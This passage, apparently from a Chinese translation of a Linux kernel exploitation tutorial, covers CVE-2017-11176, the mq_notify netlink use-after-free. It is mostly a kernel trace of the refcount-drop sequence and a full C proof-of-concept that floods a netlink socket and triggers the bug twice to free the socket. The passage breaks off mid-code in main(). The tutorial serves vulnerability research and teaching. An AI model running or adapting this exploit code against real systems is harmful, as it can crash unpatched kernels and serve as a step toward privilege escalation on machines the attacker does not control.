&lt;&lt;&lt; fget = ffff88003e3da800</span><br><span class="line">(1370-1370) &gt;&gt;&gt; fget (fd=0x3)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; fget = ffff88003e3da800</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; fget (fd=0x3)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; fget = ffff880020c1e800</span><br><span class="line">(1370-1370) &gt;&gt;&gt; fget (fd=0x3)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; fget = ffff880020c1e800</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=0x4)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; __fdget = ffff880020c1e600</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=0x4)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; __fdget = ffff880020c1e600</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; __fdget = ffff880020c1e700</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; skb_put (skb=0xffff88003d96cb00 len=0x2800)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; skb_put = ffffc9000821f000</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; netlink_attachskb (sk=0xffff880037218000 skb=0xffff88003d96cb00 timeo=0xffff88003d8cfbd8 ssk=0xffff880037218800)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; netlink_attachskb = 0</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; __fdget = ffff880020c1e700</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; skb_put (skb=0xffff88003d96c500 len=0x2800)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; skb_put = ffffc90008223000</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; netlink_attachskb (sk=0xffff880037218000 skb=0xffff88003d96c500 timeo=0xffff88003d8cfbd8 ssk=0xffff880037218800)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c5d8ca0)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c884340)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; netlink_attachskb = fffffffffffffff5</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0x0)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff880037218800)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1371) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1371) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1371) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(1370-1370) &gt;&gt;&gt; mq_notify (4294967295, 0x7fffff6932f0)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; skb_put (skb=0xffff88003d96c500 len=0x20)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; skb_put = ffff88003c8b7400</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=0x4)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; __fdget = ffff880020c1e601</span><br><span class="line">(1370-1370) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff880020c1e600)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; netlink_getsockbyfilp = ffff880037218000</span><br><span class="line">(1370-1370) &gt;&gt;&gt; netlink_attachskb (sk=0xffff880037218000 skb=0xffff88003d96c500 timeo=0xffff88003d8cff08 ssk=0x0)</span><br><span class="line">[unblock] closing 4 fd</span><br><span class="line">[unblock] unblocking now</span><br><span class="line">[+] mq_notify succeed</span><br><span class="line">[ ] creating unblock thread...</span><br><span class="line">[+] unblocking thread has been created!</span><br><span class="line">[ ] get ready to block</span><br><span class="line">(1370-1371) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1371) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1371) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1371) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1371) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(1370-1371) &lt;&lt;&lt; __fdget = ffff880020c1e601</span><br><span class="line">(1370-1370) &lt;&lt;&lt; netlink_attachskb = 1</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=0x4)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; __fdget = 0</span><br><span class="line">(1370-1370) &gt;&gt;&gt; netlink_detachskb (sk=0xffff880037218000 skb=0xffff88003d96c500)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c8b7400)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; netlink_detachskb</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff880037218000 &#125;=-</span><br><span class="line">- sk = 0xffff880037218000</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 10816</span><br><span class="line">- sk-&gt;sk_rcvbuf = 2304</span><br><span class="line">- sk-&gt;sk_refcnt = 1</span><br><span class="line">- nlk-&gt;state = 0</span><br><span class="line">- sk-&gt;sk_flags = 100</span><br><span class="line">- SOCK_DEAD = 0</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">(1370-1370) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1372) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1372) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1372) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(1370-1370) &gt;&gt;&gt; mq_notify (4294967295, 0x7fffff6932f0)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; skb_put (skb=0xffff88003d96c500 len=0x20)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; skb_put = ffff88003c8b7400</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=0x5)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; __fdget = ffff880020c1e601</span><br><span class="line">(1370-1370) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff880020c1e600)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; netlink_getsockbyfilp = ffff880037218000</span><br><span class="line">(1370-1370) &gt;&gt;&gt; netlink_attachskb (sk=0xffff880037218000 skb=0xffff88003d96c500 timeo=0xffff88003d8cff08 ssk=0x0)</span><br><span class="line">[unblock] closing 5 fd</span><br><span class="line">[unblock] unblocking now</span><br><span class="line">[+] mq_notify succeed</span><br><span class="line">[ ] ready to crash?</span><br><span class="line">[ ] press key to <span class="built_in">continue</span>...</span><br><span class="line">(1370-1372) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1372) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1372) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1372) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1372) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(1370-1372) &lt;&lt;&lt; __fdget = ffff880020c1e601</span><br><span class="line">(1370-1370) &lt;&lt;&lt; netlink_attachskb = 1</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=0x5)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; __fdget = 0</span><br><span class="line">(1370-1370) &gt;&gt;&gt; netlink_detachskb (sk=0xffff880037218000 skb=0xffff88003d96c500)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c8b7400)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c5d8c40)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c884dc0)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff880037218000)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; netlink_detachskb</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff880037218000 &#125;=-</span><br><span class="line">- sk = 0xffff880037218000</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 0</span><br><span class="line">- sk-&gt;sk_rcvbuf = 2304</span><br><span class="line">- sk-&gt;sk_refcnt = 0</span><br><span class="line">- nlk-&gt;state = 0</span><br><span class="line">- sk-&gt;sk_flags = 100</span><br><span class="line">- SOCK_DEAD = 0</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">(1370-1370) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br></pre></td></tr></table></figure>

<h3 id="Final-Proof-Of-Concept-Code"><a href="#Final-Proof-Of-Concept-Code" class="headerlink" title="Final Proof-Of-Concept Code"></a>Final Proof-Of-Concept Code</h3><p>在最后三节中，我们仅使用<em>用户态代码</em>实现触发该错误所需的所有条件。在最终的<em>proof-of-concept</em>之前，还需要做一件事。</p>
<p>在尝试填充接收缓冲区时，我们发现由于netlink_insert()，在netlink_bind()期间，refcounter加一。 这意味着在进入<em>mq_notify()之前</em>，refcounter被设置为2（而不是1）。</p>
<p>由于该错误使netlink_sock refcounter减少了1，因此我们需要<strong>两次触发该错误</strong>。</p>
<p>在触发错误之前，我们使用了*dup()*来解除阻塞主线程的方法。我们将需要再次使用它（因为旧的已关闭），因此我们可以保留一个fd来unblock，而保留另一个fd来触发该错误。</p>
<p>最终的PoC，不需要运行System Tap：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * CVE-2017-11176 Proof-of-concept code by LEXFO.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Compile with:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  gcc -fpic -O0 -std=c99 -Wall -pthread exploit.c -o exploit</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mqueue.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTIFY_COOKIE_LEN (32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOL_NETLINK (270) <span class="comment">// from [include/linux/socket.h]</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// avoid library wrappers</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _setsockopt(sockfd, level, optname, optval, optlen) \</span></span><br><span class="line">  syscall(__NR_setsockopt, sockfd, level, optname, optval, optlen)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _getsockopt(sockfd, level, optname, optval, optlen) \</span></span><br><span class="line">  syscall(__NR_getsockopt, sockfd, level, optname, optval, optlen)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _dup(oldfd) syscall(__NR_dup, oldfd)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _close(fd) syscall(__NR_close, fd)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _sendmsg(sockfd, msg, flags) syscall(__NR_sendmsg, sockfd, msg, flags)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _bind(sockfd, addr, addrlen) syscall(__NR_bind, sockfd, addr, addrlen)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRESS_KEY() \</span></span><br><span class="line">  <span class="keyword">do</span> &#123; <span class="built_in">printf</span>(<span class="string">&quot;[ ] press key to continue...\n&quot;</span>); getchar(); &#125; <span class="keyword">while</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">unblock_thread_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">int</span> sock_fd;</span><br><span class="line">  <span class="keyword">int</span> unblock_fd;</span><br><span class="line">  <span class="keyword">bool</span> is_ready; <span class="comment">// we can use pthread barrier instead</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">unblock_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">unblock_thread_arg</span> *<span class="title">uta</span> = (<span class="title">struct</span> <span class="title">unblock_thread_arg</span>*) <span class="title">arg</span>;</span></span><br><span class="line">  <span class="keyword">int</span> val = <span class="number">3535</span>; <span class="comment">// need to be different than zero</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// notify the main thread that the unblock thread has been created. It *must*</span></span><br><span class="line">  <span class="comment">// directly call mq_notify().</span></span><br><span class="line">  uta-&gt;is_ready = <span class="literal">true</span>; </span><br><span class="line"></span><br><span class="line">  sleep(<span class="number">5</span>); <span class="comment">// gives some time for the main thread to block</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ][unblock] closing %d fd\n&quot;</span>, uta-&gt;sock_fd);</span><br><span class="line">  _close(uta-&gt;sock_fd);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ][unblock] unblocking now\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (_setsockopt(uta-&gt;unblock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &amp;val, <span class="keyword">sizeof</span>(val)))</span><br><span class="line">    perror(<span class="string">&quot;[+] setsockopt&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">decrease_sock_refcounter</span><span class="params">(<span class="keyword">int</span> sock_fd, <span class="keyword">int</span> unblock_fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pthread_t</span> tid;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sigevent</span> <span class="title">sigev</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">unblock_thread_arg</span> <span class="title">uta</span>;</span></span><br><span class="line">  <span class="keyword">char</span> sival_buffer[NOTIFY_COOKIE_LEN];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// initialize the unblock thread arguments</span></span><br><span class="line">  uta.sock_fd = sock_fd;</span><br><span class="line">  uta.unblock_fd = unblock_fd;</span><br><span class="line">  uta.is_ready = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// initialize the sigevent structure</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;sigev, <span class="number">0</span>, <span class="keyword">sizeof</span>(sigev));</span><br><span class="line">  sigev.sigev_notify = SIGEV_THREAD;</span><br><span class="line">  sigev.sigev_value.sival_ptr = sival_buffer;</span><br><span class="line">  sigev.sigev_signo = uta.sock_fd;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ] creating unblock thread...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((errno = pthread_create(&amp;tid, <span class="literal">NULL</span>, unblock_thread, &amp;uta)) != <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (uta.is_ready == <span class="literal">false</span>) <span class="comment">// spinlock until thread is created</span></span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] unblocking thread has been created!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ] get ready to block\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((_mq_notify((<span class="keyword">mqd_t</span>)<span class="number">-1</span>, &amp;sigev) != <span class="number">-1</span>) || (errno != EBADF))</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] mq_notify&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] mq_notify succeed\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Creates a netlink socket and fills its receive buffer.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns the socket file descriptor or -1 on error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">prepare_blocking_socket</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> send_fd;</span><br><span class="line">  <span class="keyword">int</span> recv_fd;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">1024</span>*<span class="number">10</span>];</span><br><span class="line">  <span class="keyword">int</span> new_size = <span class="number">0</span>; <span class="comment">// this will be reset to SOCK_MIN_RCVBUF</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">addr</span> = &#123;</span></span><br><span class="line">    .nl_family = AF_NETLINK,</span><br><span class="line">    .nl_pad = <span class="number">0</span>,</span><br><span class="line">    .nl_pid = <span class="number">118</span>, <span class="comment">// must different than zero</span></span><br><span class="line">    .nl_groups = <span class="number">0</span> <span class="comment">// no groups</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> = &#123;</span></span><br><span class="line">    .iov_base = buf,</span><br><span class="line">    .iov_len = <span class="keyword">sizeof</span>(buf)</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">mhdr</span> = &#123;</span></span><br><span class="line">    .msg_name = &amp;addr,</span><br><span class="line">    .msg_namelen = <span class="keyword">sizeof</span>(addr),</span><br><span class="line">    .msg_iov = &amp;iov,</span><br><span class="line">    .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    .msg_control = <span class="literal">NULL</span>,</span><br><span class="line">    .msg_controllen = <span class="number">0</span>,</span><br><span class="line">    .msg_flags = <span class="number">0</span>, </span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ] preparing blocking netlink socket\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((send_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) &lt; <span class="number">0</span> ||</span><br><span class="line">      (recv_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] socket created (send_fd = %d, recv_fd = %d)\n&quot;</span>, send_fd, recv_fd);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (_bind(recv_fd, (struct sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (errno != EADDRINUSE)</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] bind&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> fail;</span><br><span class="line">    &#125;</span><br><span class="line">    addr.nl_pid++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] netlink socket bound (nl_pid=%d)\n&quot;</span>, addr.nl_pid);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_setsockopt(recv_fd, SOL_SOCKET, SO_RCVBUF, &amp;new_size, <span class="keyword">sizeof</span>(new_size)))</span><br><span class="line">    perror(<span class="string">&quot;[-] setsockopt&quot;</span>); <span class="comment">// no worry if it fails, it is just an optim.</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] receive buffer reduced\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ] flooding socket\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (_sendmsg(send_fd, &amp;mhdr, MSG_DONTWAIT) &gt; <span class="number">0</span>)</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> (errno != EAGAIN)</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] sendmsg&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] flood completed\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  _close(send_fd);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] blocking socket ready\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> recv_fd;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to prepare block socket\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sock_fd  = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">int</span> sock_fd2 = <span 